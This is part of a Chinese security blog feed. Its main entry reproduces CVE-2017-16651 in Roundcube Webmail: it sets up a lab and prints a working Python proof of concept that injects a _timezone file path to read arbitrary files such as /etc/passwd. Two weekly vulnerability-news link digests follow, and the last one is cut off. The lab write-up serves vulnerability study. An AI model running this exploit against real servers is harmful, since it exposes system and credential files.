    <content type="html"><![CDATA[<ol><li><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>roundcubemail作为web端的邮件客户端。是一个基于浏览器，支持多国语言的IMAP客户端，它的操作界面看起像一个桌面应用程序。它提供一个email客户端应该具备的所有功能，包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查等。</p></li><li><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Versions: 1.1.0 - 1.1.9, 1.2.0 - 1.2.6, 1.3.0 - 1.3.2</li></ul><a id="more"></a></li><li><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>已知一个用户名密码</p></li><li><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>cnetos7</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#安装apache2</span><br><span class="line">sudo yum install httpd</span><br><span class="line">sudo yum install httpd-devel</span><br><span class="line">#添加源</span><br><span class="line">sudo yum install epel-release</span><br><span class="line">sudo rpm -ivh http:&#x2F;&#x2F;rpms.famillecollet.com&#x2F;enterprise&#x2F;remi-release-7.rpm</span><br><span class="line">#列出php5.6并安装</span><br><span class="line">sudo yum install --enablerepo&#x3D;remi --enablerepo&#x3D;remi-php56 php php-opcache php-devel php-mcrypt php-mysqlnd php-phpunit-PHPUnit php-pecl-xdebug php-pecl-xhprof php-mbstring --skip-broken</span><br><span class="line">#查看php版本</span><br><span class="line">php --version</span><br></pre></td></tr></table></figure><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/1.jpg" alt></p><p>在/var/www/html/目录新建测试页，启动apache，查看页面</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/2.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#安装mysql57</span><br><span class="line">sudo wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql57-community-release-el7-11.noarch.rpm</span><br><span class="line">sudo yum -y localinstall mysql57-community-release-el7-11.noarch.rpm </span><br><span class="line">sudo yum -y install mysql-community-server</span><br><span class="line">#启动mysql并查看设置密码</span><br><span class="line">systemctl start mysqld</span><br><span class="line">sudo cat &#x2F;var&#x2F;log&#x2F;mysqld.log | grep password</span><br><span class="line">进入mysql设置密码</span><br><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;password&#39;;</span><br></pre></td></tr></table></figure><p>安装配置sendmail</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install m4 telnet mailx</span><br><span class="line">sudo yum install sendmail sendmail-cf</span><br><span class="line">m4 &#x2F;etc&#x2F;mail&#x2F;sendmail.mc &gt; &#x2F;etc&#x2F;mail&#x2F;sendmail.cf</span><br><span class="line">systemctl restart sendmail.service</span><br></pre></td></tr></table></figure><p>Dovecot安装和配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install telnet mailx mutt</span><br><span class="line">sudo yum install dovecot</span><br><span class="line">sudo vim &#x2F;etc&#x2F;dovecot&#x2F;dovecot.conf</span><br></pre></td></tr></table></figure><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/3.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;dovecot&#x2F;conf.d&#x2F;10-mail.conf</span><br><span class="line">设置mail_location &#x3D; mbox:~&#x2F;mail:INBOX&#x3D;&#x2F;var&#x2F;mail&#x2F;%u</span><br><span class="line">#启动dovecot</span><br><span class="line">systemctl start dovecot.service</span><br></pre></td></tr></table></figure><p>Roundcubemail安装和配置</p><p>下载roundcubemail-1.2.4-complete.tar.gz，解压到/var/www/html</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/4.jpg" alt></p><p>时区需要设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;php.ini</span><br></pre></td></tr></table></figure><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/5.jpg" alt></p><p>重启apache</p><p>mysql创建数据库填入roundcubemail，其余全默认，进行下一步点击Create config</p><p>将生成的config.inc.php文件放置在roundcubemail-1.2.4/config下</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/7.jpg" alt></p><p>下一步</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/8.jpg" alt></p><p>config.inc.php文件中配置数据库用户名密码</p><p>创建账户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd user1</span><br><span class="line">sudo passwd user1</span><br><span class="line">gpasswd -a user1 mail</span><br></pre></td></tr></table></figure><p>注意：远程登录关闭防火墙</p><p>使用user1/12345678进行登录</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/9.jpg" alt></p><ol><li><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2></li></ol><p>登录、抓包，修改_timezone为如下（以读取/etc/passwd文件为例）：</p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/10.jpg" alt></p><p>访问：<a href="http://192.168.254.7/roundcubemail-1.2.4/?_task=settings&amp;_action=upload-display&amp;_from=timezone&amp;_file=rcmfile1">http://192.168.254.7/roundcubemail-1.2.4/?_task=settings&amp;_action=upload-display&amp;_from=timezone&amp;_file=rcmfile1</a></p><p><img src="/2021/03/22/CVE-2017-16651-Roundcube-Webmail%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/11.jpg" alt></p><p>github上poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Reference: https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">URL=<span class="string">&quot;https://127.0.0.1/&quot;</span></span><br><span class="line">USER=<span class="string">&quot;user@example.com&quot;</span></span><br><span class="line">PASS=<span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.get(URL,params=&#123;<span class="string">&quot;_task&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;,verify=<span class="literal">False</span>)</span><br><span class="line">    token = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> r.text.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;name=&quot;_token&quot;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            token = line.split(<span class="string">&quot;value=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            print(<span class="string">&quot;[+] token: %s&quot;</span> % token)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">&quot;[!] unable to retrieve token&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;_token&quot;</span>:token,</span><br><span class="line">        <span class="string">&quot;_task&quot;</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_action&quot;</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_timezone[files][1][path]&quot;</span>:sys.argv[<span class="number">1</span>],</span><br><span class="line">        <span class="string">&quot;_url&quot;</span>:<span class="string">&quot;_task%3Dlogin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_user&quot;</span>:USER,</span><br><span class="line">        <span class="string">&quot;_pass&quot;</span>:PASS</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(URL,params=&#123;<span class="string">&quot;_task&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;,data=data,verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;_task&quot;</span>:<span class="string">&quot;settings&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_action&quot;</span>:<span class="string">&quot;upload-display&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_from&quot;</span>:<span class="string">&quot;timezone&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file&quot;</span>:<span class="string">&quot;rcmfile1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = s.get(URL,params=params,verify=<span class="literal">False</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;[!] Usage: %s &lt;file-to-read&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;roundcubemail作为web端的邮件客户端。是一个基于浏览器，支持多国语言的IMAP客户端，它的操作界面看起像一个桌面应用程序。它提供一个email客户端应该具备的所有功能，包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Versions: 1.1.0 - 1.1.9, 1.2.0 - 1.2.6, 1.3.0 - 1.3.2&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://fl4g.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="文件读取" scheme="https://fl4g.cn/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>安全快讯（2021.01.30～02.05）</title>
    <link href="https://fl4g.cn/2021/02/08/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-30%EF%BD%9E02-05%EF%BC%89/"/>
    <id>https://fl4g.cn/2021/02/08/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-30%EF%BD%9E02-05%EF%BC%89/</id>
    <published>2021-02-08T06:13:10.000Z</published>
    <updated>2021-02-08T06:25:33.367Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/02/08/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-30%EF%BD%9E02-05%EF%BC%89/1.jpg" alt></p><a id="more"></a><h1 id="安全快讯（2021-01-30～02-05）"><a href="#安全快讯（2021-01-30～02-05）" class="headerlink" title="安全快讯（2021.01.30～02.05）"></a>安全快讯（2021.01.30～02.05）</h1><h2 id="漏洞通告"><a href="#漏洞通告" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><ol><li><p>微软发布微补丁，修复Installer中的提权0day ：</p><p><a href="https://www.bleepingcomputer.com/news/security/windows-installer-zero-day-vulnerability-gets-free-micropatch/">https://www.bleepingcomputer.com/news/security/windows-installer-zero-day-vulnerability-gets-free-micropatch/</a></p></li><li><p>CVE-2021-3115——Golang Windows版本 RCE漏洞</p><p>1月，谷歌工程师修复了Go语言（Golang）中的一个远程代码执行漏洞。该漏洞CVE编号为CVE-2021-3115，漏洞主要影响使用go get命令的Windows Go用户。该漏洞是由日本安全研究人员RyotaK发现的，属于命令注入漏洞。漏洞产生的根本原因是用户运行go get命令来提取库时编译过程的工作原理造成的。</p><p>参考来源：</p><p><a href="https://www.4hou.com/posts/g826">https://www.4hou.com/posts/g826</a></p></li><li><p>Apache Druid 远程代码执行漏洞（CVE-2021-25646）</p><p>Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。</p><p>及时更新Apache Druid，下载链接为：</p><p><a href="https://druid.apache.org/downloads.html">https://druid.apache.org/downloads.html</a></p><p><a href="https://github.com/apache/druid/releases/tag/druid-0.20.1">https://github.com/apache/druid/releases/tag/druid-0.20.1</a></p></li><li><p>Apache Shiro权限绕过漏洞（CVE-2020-17523）</p><p>Apache Shiro 1.7.0之前的版本，当与Spring结合使用时，攻击者可发送特定HTTP请求导致验证绕过，获取敏感权限。</p><p>安全版本：Apache Shiro &gt;= 1.7.1</p><p>相关链接：</p><p><a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.7.1">https://github.com/apache/shiro/releases/tag/shiro-root-1.7.1</a></p></li><li><p>Azure Functions中存在提权漏洞，可逃逸至Docker主机</p><p><a href="https://securityaffairs.co/wordpress/114061/hacking/azure-functions-escape-docker.html">https://securityaffairs.co/wordpress/114061/hacking/azure-functions-escape-docker.html</a></p></li><li><p>SolarWinds软件中发现了3个新的严重安全漏洞：</p><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/full-system-control-with-new-solarwinds-orion-based-and-serv-u-ftp-vulnerabilities/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/full-system-control-with-new-solarwinds-orion-based-and-serv-u-ftp-vulnerabilities/</a></p></li><li><p>Android 发布 2 月份漏洞补丁公告，修复 5 个高危漏洞：</p><p><a href="https://threatpost.com/five-critical-bugs-patched-feb-security-bulletin/163623/">https://threatpost.com/five-critical-bugs-patched-feb-security-bulletin/163623/</a></p></li><li><p>Cisco修复SMB VPN路由器中的多个代码执行漏洞：</p><p><a href="https://www.bleepingcomputer.com/news/security/cisco-fixes-critical-code-execution-bugs-in-smb-vpn-routers/">https://www.bleepingcomputer.com/news/security/cisco-fixes-critical-code-execution-bugs-in-smb-vpn-routers/</a></p></li></ol><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><ol><li><p>意大利CERT警告新Android恶意软件Oscorp可窃取数据：</p><p><a href="https://thehackernews.com/2021/01/italy-cert-warns-of-new-credential.html">https://thehackernews.com/2021/01/italy-cert-warns-of-new-credential.html</a></p></li><li><p>Perl.com官网被劫持用以分发恶意软件：</p><p><a href="https://securityaffairs.co/wordpress/114006/hacking/website-perl-com-hijacked.html">https://securityaffairs.co/wordpress/114006/hacking/website-perl-com-hijacked.html</a></p></li><li><p>新的供应链攻击：Operation NightScout。亚洲地区的利用安卓模拟器NoxPlayer供应链攻击：</p><p><a href="https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/">https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/</a></p></li><li><p>新型间谍木马来袭，紧盯Minecraft账号信息，建议用户打开系统自动更新，并检测更新进行安装。</p><p><a href="https://mp.weixin.qq.com/s/iuhy7836KFxf6ErtMOXoTw">https://mp.weixin.qq.com/s/iuhy7836KFxf6ErtMOXoTw</a></p></li></ol><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><ol><li><p>巴基斯坦打车应用BYKEA泄露200GB的超过4亿条数据：</p><p><a href="https://www.hackread.com/bykea-data-breach-pakistani-ride-hailing-app/">https://www.hackread.com/bykea-data-breach-pakistani-ride-hailing-app/</a></p></li><li><p>泛亚大型零售连锁运营商牛奶集团(Dairy Farm Group)本月受到REvil勒索软件攻击，被勒索赎金高达3000万美元的赎金：</p><p><a href="https://www.163.com/dy/article/G1J8KKL40511A5GF.html">https://www.163.com/dy/article/G1J8KKL40511A5GF.html</a></p></li><li><p>以色列Clearsky曝光遭LC黑客入侵的250多台电信企业服务器：</p><p><a href="https://www.cnbeta.com/articles/tech/1084625.htm">https://www.cnbeta.com/articles/tech/1084625.htm</a></p></li><li><p>美国无线运营商UScellular披露数据泄露，可能已经暴露了客户的个人信息并转移了他们的电话号码：</p><p><a href="https://ago.vermont.gov/blog/2021/01/22/uscellular-notice-of-data-breach-to-consumers/">https://ago.vermont.gov/blog/2021/01/22/uscellular-notice-of-data-breach-to-consumers/</a></p></li><li><p>勒索软件运营商利用VMWare ESXi漏洞对VM磁盘进行加密：</p><p><a href="https://securityaffairs.co/wordpress/114124/malware/ransomware-attack-vmware-esxi.html">https://securityaffairs.co/wordpress/114124/malware/ransomware-attack-vmware-esxi.html</a></p></li><li><p>警察考试数据库泄露了50万印度公民的PII：</p><p><a href="https://securityaffairs.co/wordpress/114148/data-breach/police-exam-database-exposes-500k-indian-citizens-pii.html">https://securityaffairs.co/wordpress/114148/data-breach/police-exam-database-exposes-500k-indian-citizens-pii.html</a></p></li></ol><h2 id="其他资讯"><a href="#其他资讯" class="headerlink" title="其他资讯"></a>其他资讯</h2><ol><li><p>农行被银保监会罚款420万：</p><p><a href="https://finance.sina.com.cn/money/bank/gsdt/2021-02-01/doc-ikftssap2262605.shtml">https://finance.sina.com.cn/money/bank/gsdt/2021-02-01/doc-ikftssap2262605.shtml</a></p></li><li><p>Chrome再次屏蔽七个端口 以抵御NAT Slipstreaming攻击：</p><p><a href="https://www.cnbeta.com/articles/tech/1084621.htm">https://www.cnbeta.com/articles/tech/1084621.htm</a></p></li><li><p>勒索团伙Fonix宣布退出，并发布其解密密钥</p><p><a href="https://www.zdnet.com/article/fonixcrypter-ransomware-gang-releases-master-decryption-key/">https://www.zdnet.com/article/fonixcrypter-ransomware-gang-releases-master-decryption-key/</a></p></li><li><p>TikTok“查找好友”功能存在漏洞：</p><p><a href="https://mp.weixin.qq.com/s/J445HmsnsMW5pY1-T0kQng">https://mp.weixin.qq.com/s/J445HmsnsMW5pY1-T0kQng</a></p></li><li><p>Cisco反垃圾邮件服务SpamCop中断，大量邮件被拒：</p><p><a href="https://www.bleepingcomputer.com/news/security/spamcop-anti-spam-service-suffers-an-outage-after-its-domain-expired/">https://www.bleepingcomputer.com/news/security/spamcop-anti-spam-service-suffers-an-outage-after-its-domain-expired/</a></p></li><li><p>Defender ATP误将Chrome多个更新标记为PHP后门：</p><p><a href="https://www.bleepingcomputer.com/news/security/microsoft-defender-atp-detects-chrome-updates-as-php-backdoors/">https://www.bleepingcomputer.com/news/security/microsoft-defender-atp-detects-chrome-updates-as-php-backdoors/</a></p></li></ol><p><strong>【以上信息均来自互联网，若有侵权，留言删除】</strong></p><font color="#dd0000" size="6">春节停更</font> ]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/02/08/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-30%EF%BD%9E02-05%EF%BC%89/1.jpg&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="每周安全资讯" scheme="https://fl4g.cn/categories/%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
    
    <category term="网络情报" scheme="https://fl4g.cn/tags/%E7%BD%91%E7%BB%9C%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>安全快讯（2021.01.23～01.29）</title>
    <link href="https://fl4g.cn/2021/01/29/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-23%EF%BD%9E01-29%EF%BC%89/"/>
    <id>https://fl4g.cn/2021/01/29/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-23%EF%BD%9E01-29%EF%BC%89/</id>
    <published>2021-01-29T08:56:37.000Z</published>
    <updated>2021-01-29T09:30:48.403Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/01/29/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-23%EF%BD%9E01-29%EF%BC%89/1.jpg" alt></p><a id="more"></a><h1 id="安全快讯（2021-01-23～01-29）"><a href="#安全快讯（2021-01-23～01-29）" class="headerlink" title="安全快讯（2021.01.23～01.29）"></a>安全快讯（2021.01.23～01.29）</h1><h2 id="漏洞通告"><a href="#漏洞通告" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><ol><li><p>Foxit产品安全漏洞：</p><p>Foxit Reader和Foxit PhantomPDF都是中国福昕（Foxit）公司的一款PDF文档阅读器。Foxit PDF SDK ActiveX是中国福昕（Foxit）公司的一个PDF软件开发工具包，也是一个可视化编程组件。该产品提供PDF显示及注释等功能。上述产品被披露存在多个漏洞，攻击者可利用漏洞导致堆栈缓冲区溢出或越界读取，远程执行代码等。</p><p>参考链接：</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04397">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04397</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04396">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04396</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04399">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04399</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04398">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04398</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04401">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04401</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04400">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04400</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04403">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04403</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04402">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04402</a></p></li><li><p>Mozilla产品安全漏洞：</p><p>Mozilla Firefox和Mozilla Firefox ESR被披露存在多个漏洞，攻击者可利用漏洞控制标签的内容，同时URL栏显示原始域，交特殊的WEB请求，诱使用户解析，可使应用程序崩溃或可以应用程序上下文执行任意代码等。</p><p>参考链接：</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04654">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04654</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04744">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04744</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04748">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04748</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04747">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04747</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04746">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04746</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04745">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04745</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04750">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04750</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04749">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04749</a></p></li><li><p>JIZHICMS跨站脚本漏洞：</p><p>JIZHICMS 1.7.1中的Home/c/ErrorController.php存在跨站脚本漏洞。攻击者可通过index.php/Error/index?msg={XSS]利用该漏洞注入任意Web脚本或HTML。</p><p>参考链接：</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-04409">https://www.cnvd.org.cn/flaw/show/CNVD-2021-04409</a></p></li><li><p>SonicWall SSL-VPN 远程命令执行漏洞：</p><p>SonicWall SSL-VPN 历史版本中存在漏洞，远程攻击者利用 CGI 程序处理逻辑漏洞，构造恶意的<code>User-Agent</code>，可造成远程任意命令执行，并获得主机控制权限。通用修补建议：升级到  Sonic SMA 8.0.0.4。</p><p>参考链接：</p><p><a href="https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/">https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/</a></p></li><li><p>SAP Solution Manager EemAdmin 远程代码执行漏洞：</p><p>SAP Solution Manager是一套系统监控，能方便对企业进行技术相关与应用相关功能的监控。2020年SAP官方发布安全更新修复了位于UXMon中的一处远程代码执行漏洞（CVE-2020-6207）。影响版本：SAP Solution Manager &lt;= 7.2。</p><p>相关链接：</p><p><a href="https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=540935305">https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=540935305</a></p></li><li><p>Sudo 堆缓冲区溢出致本地提权漏洞（CVE-2021-3156）：</p><p>若成功利用该漏洞，可在无需密码的情况下获得root权限。下载升级sudo软件包，下载链接为：<a href="https://www.sudo.ws/dist/"> https://www.sudo.ws/dist/</a>。</p><p>相关链接：</p><p><a href="https://access.redhat.com/security/cve/CVE-2021-3156">https://access.redhat.com/security/cve/CVE-2021-3156</a></p></li><li><p>IBM WebSphere XXE 漏洞 (CVE-2020-4949)：</p><p>攻击者可构造恶意请求进行XXE攻击，造成文件读取、敏感信息泄漏等。阿里云应急响应中心提醒 WebSphere 用户尽快采取安全措施阻止漏洞攻击。</p><p>相关链接：</p><p><a href="https://www.ibm.com/support/pages/node/6408244">https://www.ibm.com/support/pages/node/6408244</a></p></li></ol><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><ol><li><p>SAP SolMan 严重漏洞的自动化 exploit 代码遭公开：</p><p><a href="https://mp.weixin.qq.com/s/KWCURIRmrRPNK7F5Br9ndw">https://mp.weixin.qq.com/s/KWCURIRmrRPNK7F5Br9ndw</a></p></li><li><p>FireEye发布了检测SolarWinds的审计工具：</p><p><a href="https://www.zdnet.com/article/fireeye-releases-tool-for-auditing-networks-for-techniques-used-by-solarwinds-hackers/">https://www.zdnet.com/article/fireeye-releases-tool-for-auditing-networks-for-techniques-used-by-solarwinds-hackers/</a></p></li><li><p>Egregor勒索软件简要分析报告：</p><p><a 